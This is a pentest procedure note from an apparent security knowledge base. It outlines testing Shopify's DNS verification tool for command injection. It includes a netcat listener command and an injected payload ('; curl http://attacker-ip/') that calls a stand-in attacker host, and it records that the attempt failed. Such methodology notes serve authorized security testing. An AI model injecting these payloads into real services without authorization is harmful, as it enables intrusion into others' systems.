---
tags:
  - rce
  - command-injection
  - dns
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/curl]]'
  - '[[tools/netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-external-request]]'
  - '[[commands/netcat-listen]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T04:38:49.197Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 48edd661-399f-48c7-af11-167f9d713c3b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Test-DNS-Check-for-RCE

## Summary

This procedure probes Shopify's DNS verification tool for command injection vulnerabilities that could lead to remote code execution via external server callbacks.

## Description

Intercept DNS check requests during domain setup and inject payloads to trigger outbound requests. Use listener tools to detect callbacks, revealing server-side execution flaws. Unsuccessful in this case, but demonstrates RCE testing methodology.

## Requirements

1. Attacker-controlled server with public IP
2. Burp Suite for interception
3. curl and netcat installed

## Defense

Defensive measures and detection strategies:

- Sanitize DNS query inputs
- Whitelist external DNS resolutions
- Monitor for unexpected outbound traffic

## Objectives

1. Inject commands in DNS checks
2. Trigger external callbacks for RCE confirmation
3. Assess verification tool security

## Instructions

### Step 1: Set Up Listener

**Context**: Prepare server to catch potential callbacks.

Execute [[commands/netcat-listen]]:

```bash
nc -lvnp 80
```

> Expected: Listener active, waiting for connections.

### Step 2: Intercept and Inject Payload

**Context**: Tamper with DNS verification request.

Use [[tools/Burp-Suite]] to capture DNS check, inject payload like `; curl http://attacker-ip/`.

### Step 3: Test Outbound

**Context**: Simulate or force external request.

Use [[commands/curl-external-request]] to verify connectivity:

```bash
curl http://attacker-ip/test
```

> Expected: No callback received, no RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/curl-external-request]]
- [[commands/netcat-listen]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/curl]]
- [[tools/netcat]]

## Tags

- [[rce]]
- [[command-injection]]
